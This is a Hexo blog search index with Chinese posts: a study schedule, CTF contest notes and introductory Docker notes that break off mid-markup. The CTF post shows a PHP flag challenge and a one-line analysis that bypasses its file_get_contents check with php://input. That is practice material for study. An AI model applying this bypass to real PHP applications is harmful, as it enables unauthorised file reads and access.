<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>1-11计划</title>
      <link href="/2022/01/11/1-11%E8%AE%A1%E5%88%92/"/>
      <url>/2022/01/11/1-11%E8%AE%A1%E5%88%92/</url>
      
        <content type="html"><![CDATA[<p>#前言</p><p>就是说，不能在摆烂了…加油</p><span id="more"></span><p>14：00-17：00   docker学习</p><p>17:30-19:30        摆烂杯</p><p>20:30-22:30        python 蓝桥杯</p><p>22:30-23:30       摆烂杯复习</p><p>睡觉</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>摆烂杯</title>
      <link href="/2022/01/08/%E6%91%86%E7%83%82%E6%9D%AF/"/>
      <url>/2022/01/08/%E6%91%86%E7%83%82%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="一行代码"><a href="#一行代码" class="headerlink" title="一行代码"></a>一行代码</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;&#123;123&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> !(!(<span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>)||(!error_reporting(<span class="number">0</span>))||stripos(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>],<span class="string">&#x27;.&#x27;</span>)||(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]!=<span class="number">0</span>)||(strlen(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>])&lt;=<span class="number">7</span>)||(!eregi(<span class="string">&quot;ctfsho&quot;</span>.substr(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>],<span class="number">0</span>,<span class="number">1</span>),<span class="string">&quot;ctfshow&quot;</span>))||substr(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>],<span class="number">0</span>,<span class="number">1</span>)==<span class="string">&#x27;w&#x27;</span>||(file_get_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>],<span class="string">&#x27;r&#x27;</span>) !== <span class="string">&quot;welcome2ctfshow&quot;</span>))?<span class="variable">$flag</span>:str_repeat(highlight_file(<span class="keyword">__FILE__</span>), <span class="number">0</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">分析</span><br><span class="line">!(<span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>) <span class="comment">//false</span></span><br><span class="line">!error_reporting(<span class="number">0</span>) <span class="comment">//false</span></span><br><span class="line">filename中是否含有.,id的值是否等于<span class="number">0</span>，content的长度是否小于<span class="number">7</span></span><br><span class="line">(file_get_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>],<span class="string">&#x27;r&#x27;</span>) !== <span class="string">&quot;welcome2ctfshow&quot;</span>) 可以使用php:<span class="comment">//input绕过</span></span><br></pre></td></tr></table></figure><h1 id="登录不了"><a href="#登录不了" class="headerlink" title="登录不了"></a>登录不了</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">web.xml</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">version</span>=<span class="string">&quot;3.0&quot;</span> </span></span><br><span class="line"><span class="tag"><span class="attr">xmlns</span>=<span class="string">&quot;http://java.sun.com/xml/ns/javaee&quot;</span> </span></span><br><span class="line"><span class="tag"><span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> </span></span><br><span class="line"><span class="tag"><span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://java.sun.com/xml/ns/javaee </span></span></span><br><span class="line"><span class="tag"><span class="string">http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span><span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>routerFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>com.ctfshow.filter.impl.RouterFilterImpl<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>routerFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/404.html<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dispatcher</span>&gt;</span>REQUEST<span class="tag">&lt;/<span class="name">dispatcher</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">error-page</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">error-code</span>&gt;</span>404<span class="tag">&lt;/<span class="name">error-code</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">location</span>&gt;</span>/404.html<span class="tag">&lt;/<span class="name">location</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">error-page</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">error-page</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">error-code</span>&gt;</span>500<span class="tag">&lt;/<span class="name">error-code</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">location</span>&gt;</span>/404.html<span class="tag">&lt;/<span class="name">location</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">error-page</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">session-config</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">cookie-config</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>ctfshow<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">http-only</span>&gt;</span>true<span class="tag">&lt;/<span class="name">http-only</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">cookie-config</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tracking-mode</span>&gt;</span>COOKIE<span class="tag">&lt;/<span class="name">tracking-mode</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">session-config</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">error-page</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">error-code</span>&gt;</span>400<span class="tag">&lt;/<span class="name">error-code</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">location</span>&gt;</span>/404.html<span class="tag">&lt;/<span class="name">location</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">error-page</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>docker第一天</title>
      <link href="/2022/01/08/docker%E7%AC%AC%E4%B8%80%E5%A4%A9/"/>
      <url>/2022/01/08/docker%E7%AC%AC%E4%B8%80%E5%A4%A9/</url>
      
        <content type="html"><![CDATA[<h3 id="Docker为什么会出现"><a href="#Docker为什么会出现" class="headerlink" title="Docker为什么会出现"></a>Docker为什么会出现</h3><p>一款产品：开发–上线  两套环境！应用环境，配置环境！</p><p>开发人员，运维人员  问题：我在我的电脑上可以用！版本更新，导致服务不可用！</p><p>环境配置十分麻烦，每一个机器都要部署环境（集群Redis，ES，Haqdoop…）！费时费力</p><p>发布一个项目：（jar+(Redis Mysql jdk ES)）项目能不能带上环境安装？</p><p>之前在服务器配置一个应用环境 Redis Mysql jdk ES,配置超麻烦，不能跨平台</p><p>传统：开发jar，运维来做</p><p>现在：开发打包部署，一套流程做完</p><p>Docker给以上问题提出解决方案</p><h3 id="什么是docker"><a href="#什么是docker" class="headerlink" title="什么是docker"></a>什么是docker</h3><p>Docker的核心思想是：隔离！打包装箱！每个箱子是相互隔离的，通过隔离将服务器利用到极致</p><p>云计算相当于一个大轮船，而Docker则相当于船上的集中箱</p><p>不同的应用程序需要不同的应用环境，需要的依赖软件不同，如果将这些应用程序安装在同一个服务器上，需要调试很久，而且还有可能会造成冲突，比如说IIS与Apache的访问端口冲突。那其实就像轮船一样，如果一条船上运输化学用品与水果，那么则会对水果造成污染。如果用集装箱，将他们隔离开来，那么则互不干扰。Docker就如集装箱一样，它具有隔离应用环境的功能，并且开销比虚拟机小</p><p>如果说开发软件用的是Ubuntu，而运维管理用的是centos。但是从Ubuntu到centos转移的过程中会遇到一些问题，就比如说是有个特殊版本的数据库，只有Ubuntu支持而cnetos不支持，那该怎么办呢？Docker可以解决这个问题。Docker可以直接将开发环境直接封装给运维，运维直接部署开发环境的Docker即可</p><p>Docker是基于Go语言开发的</p><p><a href="http://www.docker.com/">www.docker.com/</a>           </p><p>hub.docker.com/    </p><p>虚拟机技术缺点：1.资源占用十分多  2.冗余步骤多  3.启动很慢！</p><p>容器化技术：不是一个模拟完整得操作系统</p><p>传统虚拟机：虚拟出一套硬件，运行处一个完整的操作系统，在系统上安装运行软件</p><p>容器内的应用直接运行在宿主机的内核，容器是没有自己的内核的，也没有虚拟我们的硬件，所以就轻便了</p><p>每个容器间是相互隔离的，每个容器内有一个属于自己的文件系统</p><p>DevOps，应用更快速的交付与部署 ，更快速得升级与扩缩容，更简单的计算资源利用p><h3 id="Docker的基本组成"><a href="#Docker的基本组成" class="headerlink" title="Docker的基本组成"></a>Docker的基本组成</h3><p>镜像（image）：docker镜像，就好比是一个模板，可以通过这个模板来创建容器服务，tomcat镜像==》run==》tomcat01容器的（提供服务），通过这个镜像可以创建多个容器（最终服务运行或者项目运行就是在容器）</p><p>容器（container）：Docker利用容器技术，独立运行一个或一个组应用，通过镜像来创建的。启动，停止，删除，基本命令！目前就可以把这个容器理解为一个简易的linux系统</p><p>仓库（repository）：仓库就是来存放镜像的地方！仓库分为公有仓库与私有仓库！Docker Hub，阿里云…都有容器服务（配置镜像加速）</p><blockquote><p>环境查看</p><p>uname -r（显示操作系统的发行编号。）</p><p>cat /etc/os-release (查看系统版本)</p></blockquote><p>第一步：</p><p><code>卸载旧版本</code></p><p><code>sudo yum remove docker \                   docker-client \                   docker-client-latest \                   docker-common \                   docker-latest \                   docker-latest-logrotate \                   docker-logrotate \                   docker-engine</code></p><p>第二步：<br>需要的安装包</p><p>第三步：</p><p><code>设置镜像的仓库   </code></p><p><code>yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo </code></p><p>第四步：</p><p>更新yum，sudo yum makecache</p><p>安装docker相关的源</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install docker-ce docker-ce-cli containerd.io</span><br></pre></td></tr></table></figure><p>启动docker</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start docker</span><br></pre></td></tr></table></figure><p>使用docker version判断判断是否安装成功</p><p>查看一下下载的这个 hello-world镜像是否存在</p><p>卸载docker：</p><ol><li><pre><code>sudo yum remove docker-ce docker-ce-cli containerd.io<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>$ sudo rm -rf /var/lib/docker（docker的默认工作路径）$ sudo rm -rf /var/lib/containerd<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">阿里云镜像加速*（使得以后配置东西很快）：</span><br><span class="line"></span><br><span class="line">1,。登录阿里云，找到容器服务，找到镜像加速地址</span><br><span class="line"></span><br><span class="line">2.配置使用</span><br><span class="line"></span><br></pre></td></tr></table></figure>sudo mkdir -p /etc/dockersudo tee /etc/docker/daemon.json &lt;&lt;-&#39;EOF&#39;&#123;&quot;registry-mirrors&quot;: [&quot;https://xmo9t163.mirror.aliyuncs.com&quot;]&#125;EOFsudo systemctl daemon-reloadsudo systemctl restart docker<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### Run的流程</span><br><span class="line"></span><br><span class="line">![image-20220109181853023](C:\Users\12230\AppData\Roaming\Typora\typora-user-images\image-20220109181853023.png)</span><br><span class="line"></span><br><span class="line">### 底层原理：</span><br><span class="line"></span><br><span class="line">Docker是怎么工作的？</span><br><span class="line"></span><br><span class="line">Docker是一个Client-Server结构的系统，Docker的守护进程运行在主机上。通过Socket从客户端访问！DockerServer接收到Docker-Client的指令，就会执行命令</span><br><span class="line"></span><br><span class="line">![image-20220109182547817](C:\Users\12230\AppData\Roaming\Typora\typora-user-images\image-20220109182547817.png)</span><br><span class="line"></span><br><span class="line">Docker为什么比VM快？</span><br><span class="line"></span><br><span class="line">Docker比VM快</span><br><span class="line"></span><br><span class="line">Docker比虚拟机有着更少的抽象层</span><br><span class="line"></span><br><span class="line">Docker利用的是宿主机的内核，Vm需要的是Guest OS.</span><br><span class="line"></span><br><span class="line">![img](https:&#x2F;&#x2F;gimg2.baidu.com&#x2F;image_search&#x2F;src&#x3D;http%3A%2F%2Fimg-blog.csdnimg.cn%2Fimg_convert%2F91868a37481f41dbc2b53a2303ce8fff.png&amp;refer&#x3D;http%3A%2F%2Fimg-blog.csdnimg.cn&amp;app&#x3D;2002&amp;size&#x3D;f9999,10000&amp;q&#x3D;a80&amp;n&#x3D;0&amp;g&#x3D;0n&amp;fmt&#x3D;jpeg?sec&#x3D;1644315992&amp;t&#x3D;4d6610eb58d9d71ce6e1cb80353d0e03)</span><br><span class="line"></span><br><span class="line">所以说，新建一个容器的时候，Docker不需要虚拟机一样重新加载一个操作系统内核，避免引导性的操作。虚拟机加载Guest os，分钟级别的，而docker是利用宿主机的操作系统，省略了这个复杂的过程，是秒级的</span><br><span class="line"></span><br><span class="line">之后，学习完毕所有的命令，在回顾这段理论会更加清晰！</span><br><span class="line"></span><br><span class="line">### Docker的常用命令</span><br><span class="line"></span><br><span class="line">#### 帮助命令</span><br><span class="line"></span><br></pre></td></tr></table></figure>docker version #显示Docker的版本信息docker info（看docker的系统信息，包括镜像与容器的数量）docker 命令 --help（万能命令）<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">命令地址  #https:&#x2F;&#x2F;docs.docker.com&#x2F;reference&#x2F;</span><br><span class="line"></span><br><span class="line">#### 镜像命令</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96; dockerfile</span><br><span class="line">docker images</span><br><span class="line"></span><br></pre></td></tr></table></figure></code></pre></li></ol><p><img src="C:\Users\12230\AppData\Roaming\Typora\typora-user-images\image-20220109185352811.png" alt="image-20220109185352811"></p><p><img src="C:\Users\12230\AppData\Roaming\Typora\typora-user-images\image-20220109185418376.png" alt="image-20220109185418376"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">REPOSITORY  镜像的仓库源</span><br><span class="line">TAG 镜像的标签</span><br><span class="line">IMAGE ID 镜像的id</span><br><span class="line">CREATED 镜像的创建时间</span><br><span class="line">size 镜像的大小</span><br><span class="line"># 可选项</span><br><span class="line">  -a, --all            列出所有的镜像</span><br><span class="line">      --digests         Show digests</span><br><span class="line">  -f, --filter filter   Filter output based on conditions provided</span><br><span class="line">      --format string   Pretty-print images using a Go template</span><br><span class="line">      --no-trunc        Don&#39;t truncate output</span><br><span class="line">  -q, --quiet          只显示镜像的id</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="docker-search搜索命令"><a href="#docker-search搜索命令" class="headerlink" title="docker search搜索命令"></a>docker search搜索命令</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">docker search mysql</span><br><span class="line">NAME                              DESCRIPTION                                     STARS     OFFICIAL   AUTOMATED</span><br><span class="line">mysql                             MySQL is a widely used, open-source relation…   11937     [OK]</span><br><span class="line">mariadb                           MariaDB Server is a high performing open sou…   4562      [OK]</span><br><span class="line">mysql&#x2F;mysql-server                Optimized MySQL Server Docker images. Create…</span><br><span class="line">#可选项 通过收藏（STARS）来过滤</span><br><span class="line">--filter&#x3D;STARS&#x3D;3000</span><br></pre></td></tr></table></figure><h5 id="Docker-pull-下载镜像"><a href="#Docker-pull-下载镜像" class="headerlink" title="Docker pull 下载镜像"></a>Docker pull 下载镜像</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">docker pull mysql</span><br><span class="line">Using default tag: latest  #如果不写tag，默认就是最新版本</span><br><span class="line">latest: Pulling from library/mysql</span><br><span class="line">72a69066d2fe: Pull complete  #分层下载，docker image的核心</span><br><span class="line">93619dbc5b36: Pull complete</span><br><span class="line">99da31dd6142: Pull complete</span><br><span class="line">626033c43d70: Pull complete</span><br><span class="line">37d5d7efb64e: Pull complete</span><br><span class="line">ac563158d721: Pull complete</span><br><span class="line">d2ba16033dad: Pull complete</span><br><span class="line">688ba7d5c01a: Pull complete</span><br><span class="line">00e060b6d11d: Pull complete</span><br><span class="line">1c04857f594f: Pull complete</span><br><span class="line">4d7cfa90e6ea: Pull complete</span><br><span class="line">e0431212d27d: Pull complete</span><br><span class="line">Digest: sha256:e9027fe4d91c0153429607251656806cc784e914937271037f7738bd5b8e7709  #签名</span><br><span class="line">Status: Downloaded newer image for mysql:latest</span><br><span class="line">docker.io/library/mysql:latest  #真实地址</span><br><span class="line"><span class="meta">#</span><span class="bash">指定版本下载</span></span><br><span class="line"></span><br><span class="line">[root@iZuf6ixnt8107eq950q6fyZ ~]# docker pull mysql:5.7</span><br><span class="line">5.7: Pulling from library/mysql</span><br><span class="line">72a69066d2fe: Already exists</span><br><span class="line">93619dbc5b36: Already exists</span><br><span class="line">99da31dd6142: Already exists</span><br><span class="line">626033c43d70: Already exists</span><br><span class="line">37d5d7efb64e: Already exists</span><br><span class="line">ac563158d721: Already exists</span><br><span class="line">d2ba16033dad: Already exists #这些都可以不用下载了，极大的节省了内存</span><br><span class="line">0ceb82207cd7: Pull complete</span><br><span class="line">37f2405cae96: Pull complete</span><br><span class="line">e2482e017e53: Pull complete</span><br><span class="line">70deed891d42: Pull complete</span><br><span class="line">Digest: sha256:f2ad209efe9c67104167fc609cca6973c8422939491c9345270175a300419f94</span><br><span class="line">Status: Downloaded newer image for mysql:5.7</span><br><span class="line">docker.io/library/mysql:5.7</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">等价于</span></span><br><span class="line">docker pull docker.io/library/mysql:latest</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="Docker-rmi-f-镜像id"><a href="#Docker-rmi-f-镜像id" class="headerlink" title="Docker rmi -f 镜像id"></a>Docker rmi -f 镜像id</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker rmi -f c20987f18b13</span><br><span class="line">docker rmi -f 镜像id 镜像id 镜像id 镜像id#删除多个镜像</span><br><span class="line">docker rmi -f $(docker iamges -aq) #删除所有的镜像</span><br></pre></td></tr></table></figure><h4 id="容器命令"><a href="#容器命令" class="headerlink" title="容器命令"></a>容器命令</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">下载一个Centos</span></span><br><span class="line">docker pull centos</span><br><span class="line"><span class="meta">#</span><span class="bash">新建容器并启动</span></span><br><span class="line">docker run 【可选参数】 iamge</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#参数说明</span></span></span><br><span class="line">--name=&quot;Name&quot; 容器名字</span><br><span class="line">-d 后台方式运行</span><br><span class="line">-it 使用交互方式运行，进入容器查看内容</span><br><span class="line">-p 指定端口 </span><br><span class="line">-p ip：主机端口：容器端口</span><br><span class="line">-p 主机端口：容器端口（常用）</span><br><span class="line">-p 容器端口</span><br><span class="line">-P 随机指定端口</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="C:\Users\12230\AppData\Roaming\Typora\typora-user-images\image-20220109191931044.png" alt="image-20220109191931044"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">启动并进入容器</span></span><br><span class="line"></span><br><span class="line">[root@iZuf6ixnt8107eq950q6fyZ ~]# docker run -it centos /bin/bash</span><br><span class="line">[root@ae658af245fb /]# ls #查看容器内的centos</span><br><span class="line">bin  etc   lib    lost+found  mnt  proc  run   srv  tmp  var</span><br><span class="line">dev  home  lib64  media       opt  root  sbin  sys  usr</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">退出容器的命令</span></span><br><span class="line">exit</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>列出所有运行的容器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[root@iZuf6ixnt8107eq950q6fyZ ~]# docker ps（列出当前正在运行的容器）</span><br><span class="line">CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES</span><br><span class="line">[root@iZuf6ixnt8107eq950q6fyZ ~]# docker ps -a (列出当前正在运行的容器+带出历史运行的容器)</span><br><span class="line">CONTAINER ID   IMAGE         COMMAND       CREATED             STATUS                          PORTS     NAMES</span><br><span class="line">ae658af245fb   centos        &quot;/bin/bash&quot;   3 minutes ago       Exited (0) About a minute ago             goofy_mcnulty</span><br><span class="line">94f35b2e587d   hello-world   &quot;/hello&quot;      About an hour ago   Exited (0) About an hour ago              reverent_darwin</span><br><span class="line">f970b7944ec5   hello-world   &quot;/hello&quot;      2 months ago        Exited (0) 2 months ago                   funny_taussig</span><br><span class="line"><span class="meta">#</span><span class="bash"> docker ps -n=？ (列出运行过的几个容器)</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> docker ps -q (只显示运行的编号)</span></span><br></pre></td></tr></table></figure><h5 id="退出容器"><a href="#退出容器" class="headerlink" title="退出容器"></a>退出容器</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exit  #直接退出，停止容器</span><br><span class="line">Ctrl+p+Q #容器不停止退出</span><br></pre></td></tr></table></figure><h5 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker rm 容器id #不能删除正在运行的游戏，如果要强制删除 rm -f</span><br><span class="line">docker rm -f $(docker ps -aq) #删除所有的容器</span><br><span class="line">docker ps -a -q|xargs docker rm #删除所有的容器</span><br></pre></td></tr></table></figure><h5 id="启动与停止容器"><a href="#启动与停止容器" class="headerlink" title="启动与停止容器"></a>启动与停止容器</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker start 容器id  #启动容器</span><br><span class="line">docker restart 容器id #重启容器</span><br><span class="line">docker stop 容器id #停止当前正在运行的容器</span><br><span class="line">docker kill 容器id #强制停止当前容器</span><br></pre></td></tr></table></figure><h4 id="其他常用命令"><a href="#其他常用命令" class="headerlink" title="其他常用命令"></a>其他常用命令</h4><h5 id="后台启动容器"><a href="#后台启动容器" class="headerlink" title="后台启动容器"></a>后台启动容器</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@iZuf6ixnt8107eq950q6fyZ ~]# docker run -d centos</span><br><span class="line"><span class="meta">#</span><span class="bash">问题 docker ps的时候发现，centos停止了</span></span><br><span class="line"><span class="meta">#</span><span class="bash">常见的坑，容器使用在后台进行，就必须有一个前台进程，docker发现没有应用，就会自动停止</span></span><br><span class="line"><span class="meta">#</span><span class="bash">nignx,容器启动后，发现自己没有提供服务，就会l立刻停止，就是没有</span></span><br></pre></td></tr></table></figure><h5 id="查看日志"><a href="#查看日志" class="headerlink" title="查看日志"></a>查看日志</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 